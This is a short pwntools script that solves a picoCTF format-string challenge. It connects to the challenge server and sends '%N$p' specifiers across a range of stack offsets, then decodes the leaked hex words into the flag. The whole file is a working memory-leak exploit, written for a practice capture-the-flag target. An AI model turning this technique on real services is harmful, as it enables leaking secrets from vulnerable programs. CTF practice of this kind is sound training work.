#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'
host, port = 'saturn.picoctf.net', 62837


# =========================================================
#                           FUZZ
# =========================================================

flag = ''

for i in range(35, 50): # Range is obtained by fuzzing locally 
    try:
        io = remote(host, port)
        # io = process(exe)

        io.sendlineafter(b'>>', f'%{i}$p'.encode())

        io.recvuntil(b'Here\'s a story - \n')
        leak = io.recv()

        if not b'(nil)' in leak:
            print(f'stack at-{i}' + ": " + str(leak))
            try:
                hexform = unhex(leak.split()[0][2:].decode())
                flag += hexform.decode()[::-1]
                print("flag appended")
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print flag
print(f'{flag=}')